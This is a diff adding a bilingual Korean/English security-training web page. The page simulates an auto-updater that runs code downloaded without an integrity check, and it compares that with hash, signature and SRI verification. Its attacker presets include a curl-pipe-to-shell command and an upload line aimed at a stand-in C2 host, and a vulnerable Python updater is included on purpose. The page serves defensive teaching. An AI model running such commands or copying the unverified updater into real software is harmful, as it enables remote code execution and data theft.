@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head><meta name="theme-color" content="#0ea5e9"><link rel="manifest" href="/manifest.json"><link rel="icon" href="/favicon.svg" type="image/svg+xml">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>무결성 검사 없는 코드 다운로드 시뮬레이터 · WEB-VULN-SIM</title>
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="WEB-VULN-SIM 보안 학습 포털">
+<meta property="og:title" content="무결성 검사 없는 코드 다운로드 시뮬레이터 · WEB-VULN-SIM">
+<meta property="og:description" content="무결성 검사 없는 코드 다운로드 시뮬레이터 · WEB-VULN-SIM · WEB-VULN-SIM 보안 학습 포털">
+<meta property="og:url" content="https://vuln-sim.web.app/sim-code-integrity.html">
+<meta property="og:image" content="https://vuln-sim.web.app/favicon.svg">
+<meta name="twitter:card" content="summary">
+  <meta name="description" content="무결성 검사 없는 코드 다운로드(Download of Code Without Integrity Check) 모의 실습: HTTP로 받은 업데이트를 서명/해시 검증 없이 실행해 MITM 페이로드 교체로 감염되는 과정과, SHA-256·서명·HTTPS·SRI 검증 방어를 비교합니다.">
+  <style>
+    :root{
+      --bg:#0b1220; --panel:#111a2e; --panel2:#0f172a; --border:#1e293b;
+      --ink:#e2e8f0; --muted:#94a3b8; --accent:#38bdf8; --accent2:#818cf8;
+      --bad:#ef4444; --bad-bg:#3b1418; --good:#22c55e; --good-bg:#0f2a18;
+      --warn:#f59e0b; --mono:'JetBrains Mono','Consolas',monospace;
+    }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Segoe UI','Malgun Gothic',sans-serif;background:var(--bg);color:var(--ink);line-height:1.55}
+    .wrap{max-width:1200px;margin:0 auto;padding:18px 16px 80px}
+    .topbar{display:flex;align-items:center;gap:14px;background:#0b1220;border-bottom:1px solid var(--border);padding:10px 16px;position:sticky;top:0;z-index:50}
+    .topbar a{color:#7dd3fc;text-decoration:none;font-size:13px;font-family:var(--mono)}
+    .topbar .sp{margin-left:auto}
+    .langbtn{cursor:pointer;border:1px solid #334155;background:#1e293b;color:#e2e8f0;border-radius:999px;padding:5px 12px;font-size:12.5px;font-weight:700;font-family:var(--mono)}
+    .hero{padding:18px 4px 8px}
+    .hero h1{font-size:23px;color:#fff;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
+    .hero .sub{color:var(--muted);font-size:13.5px;margin-top:6px;max-width:820px}
+    .kisa{font-family:var(--mono);font-size:11px;font-weight:700;color:#0c4a6e;background:#7dd3fc;border-radius:6px;padding:2px 8px}
+    .card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:16px 18px;margin:14px 0;box-shadow:0 10px 30px rgba(0,0,0,.25)}
+    .card h2{font-size:15px;color:#7dd3fc;margin-bottom:10px;font-family:var(--mono)}
+    .row{display:flex;gap:14px;flex-wrap:wrap}.col{flex:1;min-width:280px}
+    label{display:block;font-size:12px;color:var(--muted);margin:8px 0 4px}
+    input,select,textarea{width:100%;background:var(--panel2);border:1px solid #334155;color:var(--ink);border-radius:8px;padding:9px 11px;font-family:var(--mono);font-size:13px}
+    textarea{min-height:70px;resize:vertical}
+    .btns{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+    button.act{cursor:pointer;border:none;border-radius:8px;padding:10px 16px;font-weight:700;font-size:13px;font-family:var(--mono)}
+    button.run{background:var(--bad);color:#fff}button.fix{background:var(--good);color:#06210f}button.ghost{background:#1e293b;color:#cbd5e1;border:1px solid #334155}
+    .preset{display:flex;gap:8px;flex-wrap:wrap;margin:6px 0}
+    .preset button{cursor:pointer;background:#0f172a;border:1px solid #334155;color:#cbd5e1;border-radius:999px;padding:5px 11px;font-size:11.5px;font-family:var(--mono)}
+    .preset button:hover{border-color:var(--accent);color:#fff}
+    pre,.out{background:#05080f;border:1px solid var(--border);border-radius:8px;padding:12px;font-family:var(--mono);font-size:12.5px;white-space:pre-wrap;word-break:break-word;overflow:auto;max-height:360px}
+    .out{margin-top:10px;min-height:60px}
+    .vuln{border-left:4px solid var(--bad)}.secure{border-left:4px solid var(--good)}
+    .tag{display:inline-block;font-family:var(--mono);font-size:11px;font-weight:700;border-radius:6px;padding:2px 8px}
+    .tag.bad{background:var(--bad-bg);color:#fca5a5}.tag.good{background:var(--good-bg);color:#86efac}
+    .note{background:#0f172a;border-left:4px solid var(--accent);border-radius:8px;padding:11px 13px;font-size:13px;color:#cbd5e1;margin-top:10px}
+    .note b{color:#7dd3fc}
+    .disc{margin-top:18px;font-size:12px;color:#64748b;border-top:1px dashed #334155;padding-top:10px}
+    .pipe{display:flex;align-items:stretch;gap:6px;flex-wrap:wrap;margin-top:10px}
+    .node{flex:1;min-width:110px;background:#0f172a;border:1px solid #334155;border-radius:10px;padding:10px;text-align:center;font-family:var(--mono);font-size:12px}
+    .node.cli{border-color:#38bdf8}.node.mitm{border-color:#ef4444}.node.srv{border-color:#22c55e}
+    .arrow{display:flex;align-items:center;color:#64748b;font-family:var(--mono)}
+    .crk{color:#fca5a5}.safe{color:#86efac}
+    body.lang-en .ko{display:none}body:not(.lang-en) .en{display:none}
+    @media(max-width:640px){.hero h1{font-size:19px}}
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <a href="index.html">🏠 <span data-en="Home">홈</span></a>
+    <a href="vuln-hub.html"><span data-en="Vuln Hub">취약점 학습 허브</span></a>
+    <span class="sp"></span>
+    <button class="langbtn" onclick="toggleLang()"><span data-en="한국어">English</span> ⇄</button>
+  </div>
+  <div class="wrap">
+    <div class="hero">
+      <h1>📦 <span data-en="Download of Code Without Integrity Check">무결성 검사 없는 코드 다운로드</span>
+        <span class="kisa">KISA A-2 · <span data-en="Download of Code Without Integrity Check">무결성 검사 없는 코드 다운로드</span></span></h1>
+      <div class="sub" data-en="An auto-updater fetches the next version over HTTP and runs whatever bytes arrive — no signature, no hash. A man-in-the-middle swaps the payload, and the client executes malware. Verifying a signature / SHA-256 (and using HTTPS / SRI for web scripts) stops it.">
+        자동 업데이터가 HTTP로 다음 버전을 받아 도착한 바이트를 그대로 실행합니다 — 서명도 해시도 없습니다. 중간자가 페이로드를 바꾸면 클라이언트는 악성코드를 실행합니다. 서명/SHA-256 검증(그리고 웹 스크립트엔 HTTPS/SRI)이 이를 막습니다.
+      </div>
+    </div>
+
+    <!-- 업데이트 설정 -->
+    <div class="card">
+      <h2>0 · <span data-en="Update channel">업데이트 채널</span></h2>
+      <div class="note" data-en="The vendor publishes update <b>v2.0</b>. Toggle the MITM to have an attacker on the path swap the download. Choose what the attacker injects.">
+        벤더가 업데이트 <b>v2.0</b>을 배포합니다. MITM을 켜면 경로상의 공격자가 다운로드를 바꿉니다. 공격자가 주입할 내용을 고르세요.
+      </div>
+      <label><input type="checkbox" id="mitm_on" checked style="width:auto;display:inline;margin-right:6px"> <span data-en="MITM active on download path (HTTP, no TLS)">다운로드 경로에 MITM 활성 (HTTP, TLS 없음)</span></label>
+      <label data-en="Malicious payload the attacker swaps in">공격자가 바꿔치기할 악성 페이로드</label>
+      <div class="preset" id="presets"></div>
+      <textarea id="evil">installUpdate(); exec("curl http://c2.evil/x.sh | sh"); addBackdoor();</textarea>
+    </div>
+
+    <!-- 취약 데모 -->
+    <div class="card vuln">
+      <h2>① <span data-en="Vulnerable updater: download + exec">취약한 업데이터: 다운로드 후 즉시 실행</span> <span class="tag bad">VULNERABLE</span></h2>
+      <div class="note" data-en="This client downloads update.bin over HTTP and executes it directly. It never checks a signature or hash, so it cannot tell the legit payload from the attacker's.">
+        이 클라이언트는 HTTP로 update.bin을 받아 곧바로 실행합니다. 서명이나 해시를 전혀 확인하지 않으므로 정상 페이로드와 공격자 것을 구분할 수 없습니다.
+      </div>
+      <div class="btns">
+        <button class="act run" onclick="runVuln()">▶ <span data-en="Check for updates &amp; install">업데이트 확인 후 설치</span></button>
+      </div>
+      <div class="pipe">
+        <div class="node srv">🏢 <span data-en="Vendor">벤더</span><br>v2.0</div>
+        <div class="arrow">──▶</div>
+        <div class="node mitm" id="v_mitm">🕵️ MITM</div>
+        <div class="arrow">──▶</div>
+        <div class="node cli">💻 <span data-en="Client">클라이언트</span></div>
+      </div>
+      <div class="out" id="v_out"></div>
+    </div>
+
+    <!-- 방어 비교 -->
+    <div class="card secure">
+      <h2>② <span data-en="Secure updater: verify signature / SHA-256">안전한 업데이터: 서명 / SHA-256 검증</span> <span class="tag good">SECURE</span></h2>
+      <div class="note" data-en="The vendor signs the release and publishes the expected SHA-256 over a trusted channel. The client downloads, recomputes the hash, verifies the signature against a pinned public key, and only then executes. A tampered payload fails the check.">
+        벤더는 릴리스에 서명하고 기대 SHA-256을 신뢰 채널로 게시합니다. 클라이언트는 다운로드 후 해시를 재계산하고, 핀된 공개키로 서명을 검증한 뒤에만 실행합니다. 변조된 페이로드는 검사를 통과하지 못합니다.
+      </div>
+      <div class="btns">
+        <button class="act fix" onclick="runSecure()">▶ <span data-en="Download, verify, then run">다운로드·검증 후 실행</span></button>
+      </div>
+      <div class="out" id="s_out"></div>
+    </div>
+
+    <!-- 코드 비교 -->
+    <div class="card">
+      <h2>③ <span data-en="Vulnerable vs Secure code">취약 vs 안전 코드</span></h2>
+      <div class="row">
+        <div class="col">
+          <span class="tag bad">VULNERABLE</span>
+          <pre># Python — 받은 코드를 그대로 실행
+import urllib.request, os
+def update():
+    data = urllib.request.urlopen(
+        "http://updates.app/v2/update.bin").read()
+    open("update.bin","wb").write(data)
+    os.system("./update.bin")     # 무결성 검사 0 → MITM이면 악성코드 실행</pre>
+        </div>
+        <div class="col">
+          <span class="tag good">SECURE</span>
+          <pre># Python — 해시+서명 검증 후 실행
+import hashlib, urllib.request
+EXPECTED = "9f86d0818..."          # 신뢰 채널로 받은 SHA-256
+PUBKEY = load_vendor_pubkey()       # 핀된 공개키
+def update():
+    data = urllib.request.urlopen(
+        "https://updates.app/v2/update.bin").read()   # HTTPS
+    if hashlib.sha256(data).hexdigest() != EXPECTED:
+        raise SystemExit("hash mismatch - aborting")
+    if not verify_sig(data, sig, PUBKEY):
+        raise SystemExit("bad signature - aborting")
+    run(data)                       # 검증된 코드만 실행
+
+&lt;!-- 웹 스크립트는 SRI 로 무결성 고정 --&gt;
+&lt;script src="https://cdn/app.js"
+  integrity="sha384-oqVuAfXR..." crossorigin&gt;&lt;/script&gt;</pre>
+        </div>
+      </div>
+      <div class="note" data-en="<b>Defense keys:</b> always verify a cryptographic signature (and/or a SHA-256 pinned via a trusted channel) before running downloaded code; fetch over HTTPS; pin the vendor's public key; for web assets use Subresource Integrity (SRI) with crossorigin; fail closed on any mismatch and never auto-run unverified bytes."><b>방어 핵심:</b> 다운로드한 코드는 실행 전 항상 암호 서명 검증(또는 신뢰 채널로 핀된 SHA-256 확인) · HTTPS로 받기 · 벤더 공개키 핀닝 · 웹 자원은 crossorigin과 함께 SRI 사용 · 불일치 시 fail-closed, 미검증 바이트 자동 실행 금지.</div>
+    </div>
+
+    <div class="disc" data-en="Educational simulation only. The download, MITM, hashing, and signature check are an in-page mock; no real network, files, or code execution occur.">
+      ⚠️ 교육용 시뮬레이션입니다. 다운로드·MITM·해시·서명 검증은 페이지 내부 mock이며 실제 네트워크·파일·코드 실행은 일어나지 않습니다.
+    </div>
+  </div>
+
+<script>
+function isEn(){try{return (localStorage.getItem('wvs_lang')||localStorage.getItem('lang'))==='en';}catch(e){return false;}}
+function L(ko,en){return isEn()?en:ko;}
+function applyLang(){
+  var en=isEn();
+  document.documentElement.lang=en?'en':'ko';
+  document.querySelectorAll('[data-en]').forEach(function(el){
+    if(el.getAttribute('data-ko')===null) el.setAttribute('data-ko', el.innerHTML);
+    el.innerHTML = en ? el.getAttribute('data-en') : el.getAttribute('data-ko');
+  });
+  document.body.classList.toggle('lang-en', en);
+  if(window.renderDynamic){try{window.renderDynamic();}catch(e){}}
+}
+function toggleLang(){try{var v=isEn()?'ko':'en';localStorage.setItem('wvs_lang',v);localStorage.setItem('lang',v);}catch(e){}applyLang();}
+document.addEventListener('DOMContentLoaded', applyLang);
+function escapeHtml(s){return (s+'').replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];});}
+
+// mock SHA-256 (실제 아님, 결정적)
+function mockSha(str){
+  var h=0x6a09e667>>>0;
+  for(var i=0;i<str.length;i++){ h^=str.charCodeAt(i); h=Math.imul(h,0x01000193)>>>0; h=(h<<13|h>>>19)>>>0; }
+  var h2=0xbb67ae85>>>0; for(var j=0;j<str.length;j++){ h2=Math.imul(h2^str.charCodeAt(j),0x85ebca6b)>>>0; }
+  return 'sha256-'+h.toString(16).padStart(8,'0')+h2.toString(16).padStart(8,'0');
+}
+
+// 벤더가 서명/게시한 정품 v2.0
+var LEGIT='installUpdate(); patchFiles(["a.dll","b.dll"]); bumpVersion("2.0");';
+var EXPECTED_HASH=mockSha(LEGIT);
+var VENDOR_SIG='sig:'+mockSha('VENDOR_PRIVKEY|'+LEGIT); // 벤더 개인키 서명 모사
+
+var PRESETS=[
+  {label:L('C2 백도어','C2 backdoor'), v:'installUpdate(); exec("curl http://c2.evil/x.sh | sh"); addBackdoor();'},
+  {label:L('랜섬웨어','Ransomware'), v:'encryptAllFiles(); demandRansom("1 BTC");'},
+  {label:L('자격증명 탈취','Cred stealer'), v:'stealBrowserCookies(); upload("http://c2.evil/loot");'},
+  {label:L('정품으로 위장','Trojan-as-update'), v:'installUpdate(); /* +hidden */ keylogger.start();'}
+];
+function buildPresets(){
+  var box=document.getElementById('presets'); box.innerHTML='';
+  PRESETS.forEach(function(p){
+    var b=document.createElement('button'); b.textContent=p.label;
+    b.onclick=function(){ document.getElementById('evil').value=p.v; };
+    box.appendChild(b);
+  });
+}
+
+function received(){
+  var mitm=document.getElementById('mitm_on').checked;
+  var payload = mitm ? document.getElementById('evil').value : LEGIT;
+  return {mitm:mitm, payload:payload};
+}
+
+function runVuln(){
+  var r=received();
+  document.getElementById('v_mitm').style.borderColor = r.mitm?'#ef4444':'#334155';
+  var lines=[];
+  lines.push('GET http://updates.app/v2/update.bin  // '+L('평문 HTTP','plain HTTP'));
+  lines.push(L('수신 바이트:','received bytes:')+' '+r.payload.length+' B');
+  lines.push('sha256(received) = '+mockSha(r.payload));
+  lines.push(L('서명 확인:','signature check:')+' '+L('없음','none')+'   '+L('해시 확인:','hash check:')+' '+L('없음','none'));
+  lines.push('exec(update.bin)  // '+L('받은 그대로 실행','run whatever arrived'));
+  lines.push('');
+  lines.push('── '+L('실행된 코드','executed code')+' ──');
+  lines.push(escapeHtml(r.payload));
+  lines.push('');
+  if(r.mitm){
+    lines='<span>'+lines.join('\n')+'</span>\n<span class="crk">💥 '+L('시스템 감염 — 공격자 페이로드가 실행되었습니다. 클라이언트는 변조를 탐지할 수단이 전혀 없었습니다.','SYSTEM COMPROMISED — the attacker payload ran. The client had no way to detect tampering.')+'</span>';
+  }else{
+    lines='<span>'+lines.join('\n')+'</span>\n<span class="crk">⚠ '+L('이번엔 정품이 실행됐지만, 검증이 없으므로 MITM이 끼는 순간 곧바로 감염됩니다.','The genuine update ran this time, but with no verification, any MITM means instant compromise.')+'</span>';
+  }
+  document.getElementById('v_out').innerHTML=lines;
+}
+
+function runSecure(){
+  var r=received();
+  var actualHash=mockSha(r.payload);
+  var actualSig='sig:'+mockSha('VENDOR_PRIVKEY|'+r.payload); // 공격자는 벤더 개인키가 없어 유효 서명 생성 불가
+  var lines=[];
+  lines.push('GET https://updates.app/v2/update.bin  // HTTPS');
+  lines.push(L('기대 SHA-256 (신뢰 채널):','expected SHA-256 (trusted channel):')+'\n  '+EXPECTED_HASH);
+  lines.push(L('수신 SHA-256:','received SHA-256:')+'\n  '+actualHash);
+  var hashOk=(actualHash===EXPECTED_HASH);
+  lines.push(L('해시 비교:','hash compare:')+' '+(hashOk?'MATCH ✅':'MISMATCH ❌'));
+  var sigOk=(actualSig===VENDOR_SIG);
+  lines.push(L('서명 검증(핀된 공개키):','signature verify (pinned pubkey):')+' '+(sigOk?'VALID ✅':'INVALID ❌'));
+  lines.push('');
+  if(hashOk && sigOk){
+    lines.push('run(update.bin)  // '+L('검증 통과 → 실행','verified → execute'));
+    lines='<span>'+lines.join('\n')+'</span>\n<span class="safe">✅ '+L('정품 업데이트만 실행됩니다.','only the genuine update runs.')+'</span>';
+  }else{
+    lines.push('abort()  // fail-closed');
+    var reason = !hashOk ? L('해시 불일치로 변조 탐지','tampering detected via hash mismatch') : L('서명 무효(공격자는 벤더 개인키가 없음)','invalid signature (attacker lacks the vendor private key)');
+    lines='<span>'+lines.join('\n')+'</span>\n<span class="safe">🛡 '+L('실행 거부 — '+reason+'. 공격 차단.','execution refused — '+reason+'. attack blocked.')+'</span>';
+  }
+  document.getElementById('s_out').innerHTML=lines;
+}
+
+document.addEventListener('DOMContentLoaded',function(){
+  document.getElementById('mitm_on').addEventListener('change',function(){
+    document.getElementById('v_mitm').style.borderColor=this.checked?'#ef4444':'#334155';
+  });
+});
+window.renderDynamic=function(){ buildPresets(); };
+buildPresets();
+</script>
+</body>
+</html>
